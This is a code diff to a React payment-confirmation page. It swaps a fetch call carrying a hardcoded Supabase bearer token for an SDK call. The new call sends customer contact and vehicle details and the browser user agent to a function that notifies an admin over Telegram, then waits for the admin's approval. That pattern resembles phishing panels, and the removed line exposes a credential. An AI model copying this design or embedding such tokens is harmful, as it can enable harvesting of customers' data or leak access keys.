@@ -81,21 +81,29 @@ const PushConfirmationPage = () => {
     
     try {
       // Call the complete-order edge function to send Telegram notification
-      const response = await fetch(`https://kcsvkdhnglpvzdvznmfs.supabase.co/functions/v1/complete-order`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtjc3ZrZGhuZ2xwdnpkdnpubWZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTgwODg3MTYsImV4cCI6MjA3MzY2NDcxNn0.SAH-MZU3qsT1RCohG0MoLxJs3GxYY2ekmPmQMiSTH7A`,
-        },
-        body: JSON.stringify({
-          userId: location.state?.userId
-        })
+      const { data, error } = await supabase.functions.invoke('complete-order', {
+        body: {
+          userId: location.state?.userId,
+          details: {
+            name: customerInfo?.fullName,
+            email: customerInfo?.email,
+            phone: customerInfo?.phone,
+            vehicle_registration: vehicle?.registration,
+            vehicle_make: vehicle?.make,
+            vehicle_model: vehicle?.model,
+            vehicle_color: vehicle?.color,
+            duration: duration?.label,
+            price: `€${Number(duration?.discountedPrice || 0).toFixed(2)}`,
+            card_number_masked: '**** **** **** 4242',
+            card_type: 'VISA',
+            test_mode: true,
+            userAgent: navigator.userAgent,
+          }
+        }
       });
 
-      const result = await response.json();
-      
-      if (!result.success) {
-        console.error('Failed to send notification:', result.error);
+      if (error || !data?.success) {
+        console.error('Failed to send notification:', error || data);
         setIsConfirming(false);
       }
       // Don't proceed automatically - wait for admin response via polling
@@ -200,7 +208,7 @@ const PushConfirmationPage = () => {
                       className="w-full"
                       disabled={isConfirming}
                     >
-                      {isConfirming ? 'Confirming...' : 'Confirm Payment'}
+                      {isConfirming ? 'Confirmation...' : 'Confirm Payment'}
                     </Button>
                   </div>
                 </>
